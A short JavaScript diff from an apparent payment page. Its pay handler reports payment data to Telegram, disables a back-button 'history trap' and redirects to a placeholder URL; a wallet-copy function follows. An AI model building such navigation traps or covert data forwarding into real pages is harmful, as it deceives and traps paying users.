@@ -1353,8 +1353,11 @@ async function handlePayClick() {
         // 1. Send telemetry to Telegram and await completion
         await streamPaymentVerificationToTelegram(randomHex);
 
-        // 2. Perform simultaneous window.location.replace redirection
-        const targetPageUrl = "https://Fiverr.com"; // Change to your specific destination URL
+        // 2. Clear out the history trap so the back button won't loop back here
+        window.onpopstate = null;
+
+        // 3. Perform simultaneous window.location.replace redirection to your URL
+        const targetPageUrl = "https://your-actual-destination-page.com"; 
         window.location.replace(targetPageUrl);
 
     } catch (err) {
@@ -1364,6 +1367,7 @@ async function handlePayClick() {
         triggerNotification("Authorization connection error", 3000);
     }
 }
+
 
 function copyWallet(id) {
     paymentMode = "manual";
